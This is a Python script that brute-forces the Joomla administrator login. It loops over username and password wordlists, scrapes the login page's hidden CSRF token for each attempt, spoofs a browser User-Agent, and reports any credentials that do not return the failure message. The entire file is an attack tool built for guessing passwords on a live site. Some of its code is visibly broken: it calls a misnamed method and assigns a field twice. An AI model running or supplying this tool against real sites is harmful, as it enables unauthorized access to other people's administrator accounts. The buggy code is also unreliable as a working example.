import requests
import re
import argparse
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
class Joomla():
    def __init__(self):
        self.initializeVariables()
        self.sendrequest()
        
    def initializeVariables(self):
        #Initialize args
        parser = argparse.ArgumentParser(description='Joomla login bruteforce')
        #required
        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site url')
        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')

        #optional
        parser.add_argument('-p', '--proxy', type=str, help='Using proxy. Optional. http://127.0.0.1:8080')
        parser.add_argument('-v', '--verbose', action='store_true', help='Shows output.')
        #these two arguments should not be together
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str, help='One single username')
        group.add_argument('-U', '--userlist', type=str, help='Username list')

        args = parser.parse_args()

        #parse args and save proxy
        if args.proxy:
            parsedproxyurl = urlparse(args.proxy)
            self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
        else:
            self.proxy=None

        #determine if verbose or not
        if args.verbose:
            self.verbose=True
        else:
            self.verbose=False

        #http:/site/administratorgetdata
        self.url = args.url+'/administrator/'
        
        # the following parameters should be find in the webpage source
        # self.ret = 'aW5kZXgucGhw'
        self.ret=''
        self.option='com_login'
        self.task='login'

        
        #Need cookie
        self.cookies = requests.session().get(self.url).cookies.get_dict()
        #Wordlist from args
        self.wordlistfile = args.wordlist
        self.username = args.username
        self.userlist = args.userlist
        
    def sendrequest(self):
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username=user.decode('utf-8')
                self.doGET()
        else:
            self.doGet()
	
    def doGet(self):
    	for password in self.getdata(self.wordlistfile):
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
            }
			# first get for ret and csrf
            res = requests.get(self.url,proxies=self.proxy, cookies=self.cookies, headers=headers)
            hidden = re.findall("<input type=\"hidden\" name=\"(.*)\" value=\"(.*)\"", res.text)
            # [('option', 'com_login'), ('task', 'login'), ('return', 'aW5kZXgucGhw'), ('c9496f3f374b3239bc01ae9b83c4fdd4', '1')]
            self.ret = hidden[0][1]
            self.task = hidden[1][1]
            self.ret = hidden[2][1]
            self.csrf = hidden[3][0]
            data={
                'username' : self.username,
                'passwd' : password,
                'option' : self.option,
                'task' : self.task,
                'return' : self.ret,
                self.csrf : 1
            }
            res2 = requests.post(self.url, data =data, proxies=self.proxy,cookies=self.cookies,headers=headers)
            if self.verbose:
                print(f'testing {self.username} : {password}')
            msg = re.findall('<div class="alert-message">(.*)</div>', res2.text)[0]
            # login failed
            if 'Username and password do not match' in msg:
                if self.verbose:
                    print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
            else:
                print(f'{bcolors.OKGREEN} success!! {self.username}:{password}{bcolors.ENDC}')
                break
    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data

joomla=Joomla()



